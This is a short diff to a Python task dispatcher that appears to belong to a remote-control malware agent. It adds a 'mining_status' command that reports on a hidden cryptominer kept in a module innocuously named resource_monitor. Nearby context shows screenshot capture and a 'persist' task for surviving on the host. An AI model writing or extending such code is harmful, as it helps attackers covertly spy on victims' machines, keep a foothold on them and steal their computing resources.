@@ -529,6 +529,22 @@ def execute_task(task):
                 else:
                     result = "mss not installed; run: pip install mss"
 
+        elif tt == "mining_status":
+            # Check mining status from resource_monitor
+            try:
+                from .resource_monitor import check_mining_status
+                status = check_mining_status()
+                result = f"Mining Status:\n"
+                result += f"  Running: {status['running']}\n"
+                result += f"  Binary: {status['binary']}\n"
+                result += f"  Binary exists: {status['binary_exists']}\n"
+                result += f"  Config exists: {status['config_exists']}\n"
+                result += f"  Cache dir: {status['cache_dir']}"
+            except ImportError:
+                result = "resource_monitor not available"
+            except Exception as e:
+                result = f"Error checking mining status: {e}"
+
         elif tt == "persist":
             plat = detect_platform()
             script = os.path.abspath(__file__)
